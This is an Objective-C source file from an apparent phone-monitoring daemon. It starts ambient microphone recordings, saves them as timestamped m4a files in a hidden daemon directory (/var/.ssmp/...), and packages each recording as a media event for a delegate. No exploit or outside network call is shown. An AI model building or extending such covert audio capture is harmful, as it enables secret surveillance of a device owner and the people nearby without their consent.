/**
 - Project name :  AmbientRecordingManager Component
 - Class name   :  AmbientRecordingManagerImpl
 - Version      :  1.0  
 - Purpose      :  Ambient record manager
 - Copy right   :  29/11/2012, Benjawan Tanarattanakorn, Vervata Co., Ltd. All rights reserved.
 */

#import "AmbientRecordingManagerImpl.h"
#import "AmbientRecorder.h"
#import "MediaThumbnailManagerImp.h"
#import "MediaInfo.h"
#import "MediaErrorConstant.h"
#import "FxMediaEvent.h"
#import "FxThumbnailEvent.h"
#import "DateTimeFormat.h"
#import "EventDelegate.h"
#import "DaemonPrivateHome.h"

#import <AudioToolbox/AudioToolbox.h>

@interface AmbientRecordingManagerImpl (private)
- (NSString *) createTimeStamp;
- (NSString *) getOutputPath: (NSString *) aOutputPathWithoutExtension 
				   extension: (NSString *) aExtension;
@end 

@implementation AmbientRecordingManagerImpl

//@synthesize mAmbientRecordingDelegate;

- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate outputPath: (NSString *) aOutputDirectory {
	self = [super init];
	if (self != nil) {
		
		NSString *thumbnailPath = [aOutputDirectory stringByAppendingString:@"thumbnails/"];
		[DaemonPrivateHome createDirectoryAndIntermediateDirectories: thumbnailPath];
		mMediaThumbnailManagerImp = [[MediaThumbnailManagerImp alloc] initWithThumbnailDirectory:thumbnailPath];
		
		DLog (@"Ambient recording's output path %@, thumbnail path = %@", aOutputDirectory, thumbnailPath)
		
		mEventDelegate				= aEventDelegate;
		
		NSString *audioPath = [NSString stringWithFormat:@"%@%@/", aOutputDirectory, @"audio"]; // e.g., /var/.ssmp/media/capture/audio/
		[DaemonPrivateHome createDirectoryAndIntermediateDirectories: audioPath];
		mOutputDirectory			= [[NSString alloc] initWithString:audioPath];
		
		mIsCreatingThumbnail		= FALSE;
		
		mAmbientRecorder			= [[AmbientRecorder alloc] init];
		[mAmbientRecorder setMRecordCompleteSelector:@selector(ambientRecordCompleted:)];	// define Selector
		[mAmbientRecorder setMDelegate:self];												// define the object that will be called for Selector			
	}
	return self;
}

- (void) prerelease {
    // Perform selector delay in AmbientRecorder thus cancel it
    [NSObject cancelPreviousPerformRequestsWithTarget:self];
}

#pragma mark -
#pragma mark Protocol AmbientRecordingManager


- (NSInteger) startRecord: (NSInteger) aDurationInMinute ambientRecordingDelegate: (id <AmbientRecordingDelegate>) aAmbientRecordingDelegate {
	mAmbientRecordingDelegate = aAmbientRecordingDelegate;
	
	StartAmbientRecorderErrorCode startRecordingStatus = kStartAmbientRecordingIsRecording;
	if (![self isRecording]) {
		NSString *recordingPath = [self getOutputPath:mOutputDirectory extension:@"m4a"];
		DLog (@"recordingPath %@", recordingPath)
		[mAmbientRecorder setMRecordingFilePath:recordingPath];	
		[mAmbientRecorder setMDelegate:self];
		startRecordingStatus = [mAmbientRecorder startRecord:aDurationInMinute];
	} 
	return startRecordingStatus;
}

- (void) stopRecording {
	[mAmbientRecorder stopRecord];
}

/* 
 The return value will be
	TRUE: when	- recording
				- creating thumbnail
	FALSE: when - not recording (recording has bee successed, failed, never record before)
				- not creating thumbnail
 */
- (BOOL) isRecording { 
	BOOL isBusy =  YES;
	BOOL isRecording = [[mAmbientRecorder mAudioRecorder] isRecording];
	if (!isRecording) {
		// check thumnbail creation status
		if (!mIsCreatingThumbnail) {
			isBusy = NO;
		} else {
			DLog (@"!! busy creating thumbnail")
		}
	} else {
		DLog (@"!! busy recording")
	}
	DLog (@"isRecording %d", isBusy)
	return isBusy;
}

//- (void) setAmbientRecordingDelegate: (id <AmbientRecordingDelegate>) aDelegate {	
//	mAmbientRecordingDelegate = aDelegate;
//}


#pragma mark -
#pragma mark Private method


// get thumbnail path with its extension
- (NSString *) getOutputPath: (NSString *) aOutputPathWithoutExtension 
				   extension: (NSString *) aExtension {
	NSString *formattedDateString = [self createTimeStamp];
	NSString *outputPath = [[NSString alloc] initWithFormat:@"%@ambient_record_%@.%@",
							aOutputPathWithoutExtension, 
							formattedDateString, 
							aExtension];
	return [outputPath autorelease];
}

// create timestamp of now
- (NSString *) createTimeStamp {
	NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
	[dateFormatter setDateFormat:@"yyyy-MM-dd_HH:mm:ss:SSS"];
	NSString *formattedDateString = [[dateFormatter stringFromDate:[NSDate date]] retain];
	[dateFormatter release];
	return [formattedDateString autorelease];
}


#pragma mark -
#pragma mark Method that will be callbed by AmbientRecorder

/* 
 possible error for this method is 
 - kAmbientRecordingOK
 - kAmbientRecordingEndByInterruption
 - kAmbientRecordingAudioEncodeError
 */
- (void) ambientRecordCompleted: (NSDictionary *) aRecordingResult {
    
    id <AmbientRecordingDelegate> currentAmbientRecordingDelegate = mAmbientRecordingDelegate;
    mAmbientRecordingDelegate = nil;
    
	NSString *outputPath		= [aRecordingResult objectForKey:kPathKey];	
	NSError *error				= [aRecordingResult objectForKey:kErrorKey];
	NSInteger durationInSeconds = [[aRecordingResult objectForKey:kDurationKey] intValue];
	
	DLog (@"ambientRecordCompleted error: %@", error)
	if ([error code] == kAmbientRecordingOK ||							// record success with the complete duration
		[error code] == kAmbientRecordingEndByInterruption) {			// an interuption ocurrs during recording but we can save the recorded file
		
		// Use case 1: create thumbnail for ambient recording (obsolete)
//		mIsCreatingThumbnail = TRUE;
//		
//		if (mAmbientRecordingError)										// keep error for sending to the delegate
//			[mAmbientRecordingError release];	
//		mAmbientRecordingError = error;
//		[mAmbientRecordingError retain];
//		[mMediaThumbnailManagerImp createAudioThumbnail:outputPath delegate:self];
		
		// Use case 2: no thumbnail for ambient recording...
//		NSURL *afUrl = [NSURL fileURLWithPath:outputPath];
//		AudioFileID fileID;
//		OSStatus result = AudioFileOpenURL((CFURLRef)afUrl, kAudioFileReadPermission, 0, &fileID);
//		DLog (@"AudioFileOpenURL, OSStatus = %d", result);
//		UInt64 outDataSize = 0;
//		UInt32 thePropSize = sizeof(UInt64);
//		result = AudioFileGetProperty(fileID, kAudioFilePropertyEstimatedDuration, &thePropSize, &outDataSize);
//		DLog (@"AudioFileGetProperty, OSStatus = %d", result);
//		DLog (@"outDataSize = %d", outDataSize);
//		AudioFileClose(fileID);
		
		// 1. Create media event
		FxMediaEvent *mediaEvent = [[FxMediaEvent alloc]init];
		[mediaEvent setEventType:kEventTypeAmbientRecordAudio];					
		[mediaEvent setFullPath:outputPath];
		[mediaEvent setMDuration:durationInSeconds];
		[mediaEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		
		if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
			[mEventDelegate performSelector:@selector(eventFinished:) withObject:mediaEvent];
		}
		[mediaEvent release];
		
		// 2. Call to delegate
		if (currentAmbientRecordingDelegate && [currentAmbientRecordingDelegate respondsToSelector:@selector(recordingCompleted:)]) {
			[currentAmbientRecordingDelegate performSelector:@selector(recordingCompleted:) withObject:error];
		}
		
	} else if ([error code] == kAmbientRecordingAudioEncodeError) {
		DLog (@"fail to record")
		mIsCreatingThumbnail = FALSE;
		// Possible error code: kAmbientRecordingAudioEncodeError
		if (currentAmbientRecordingDelegate && [currentAmbientRecordingDelegate respondsToSelector:@selector(recordingCompleted:)]) {
			[currentAmbientRecordingDelegate performSelector:@selector(recordingCompleted:) withObject:error];
		}	
	}
}


#pragma mark -
#pragma mark MediaThumbnailDelegate


/* 
 possible output error for this method is 
 - kAmbientRecordingOK
 - kAmbientRecordingEndByInterruption
 - kAmbientRecordingThumbnailCreationError
 */

- (void) thumbnailCreationDidFinished: (NSError *) aError
							mediaInfo: (MediaInfo *) aMedia
						thumbnailPath: (id) aPaths {

	DLog (@"aError = %@, aMedia = %@, aPaths = %@, aMedia.mMediaSize = %llu", aError, aMedia, aPaths, [aMedia mMediaSize]);
	if ([aError code] == kMediaThumbnailOK ||
		([aError code] == kMediaThumbnailCannotGetThumbnail && [aMedia mMediaInputType] != kMediaInputTypeImage)) {

		FxThumbnailEvent *tEvent = [[FxThumbnailEvent alloc] init];
		[tEvent setFullPath:(NSString *) aPaths];
		[tEvent setEventType:kEventTypeAmbientRecordAudioThumbnail];		
		[tEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		[tEvent setActualSize:[aMedia mMediaSize]];
		[tEvent setActualDuration:[aMedia mMediaLength]];
		
		FxMediaEvent *mediaEvent = [[FxMediaEvent alloc]init];
		[mediaEvent addThumbnailEvent:tEvent];
		[tEvent release];
		
		[mediaEvent setEventType:kEventTypeAmbientRecordAudio];					
		[mediaEvent setFullPath:[aMedia mMediaFullPath]];
		[mediaEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		
		if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
			[mEventDelegate performSelector:@selector(eventFinished:) withObject:mediaEvent];
		}
		[mediaEvent release];
			
		// Possible error code: kAmbientRecordingOK, kAmbientRecordingEndByInterruption
		DLog (@"thumbnailCreationDidFinished error: %@", mAmbientRecordingError)
		// -- inform delegate
		if (mAmbientRecordingDelegate && [mAmbientRecordingDelegate respondsToSelector:@selector(recordingCompleted:)]) {
			[mAmbientRecordingDelegate performSelector:@selector(recordingCompleted:) withObject:mAmbientRecordingError];
		}
										  
	} else { 
		// Possible error code from ThumnailManager:	kMediaThumbnailCannotGetDuration, kMediaThumbnailException 		
		// -- inform delegate
		NSError *error			= [[NSError alloc] initWithDomain:kErrorDomain
															 code:kAmbientRecordingThumbnailCreationError
														 userInfo:[aError userInfo]];
		if (mAmbientRecordingDelegate && [mAmbientRecordingDelegate respondsToSelector:@selector(recordingCompleted:)]) {
			[mAmbientRecordingDelegate performSelector:@selector(recordingCompleted:) withObject:error];
		}
		[error release];
	}
	
	mIsCreatingThumbnail = FALSE;
}

- (void) dealloc {
	[mMediaThumbnailManagerImp release];
	mMediaThumbnailManagerImp = nil;
	[mAmbientRecorder release];
	mAmbientRecorder = nil;
	[mOutputDirectory release];
	mOutputDirectory = nil;
	[mAmbientRecordingError release];
	mAmbientRecorder = nil;
	
	[super dealloc];
}

@end
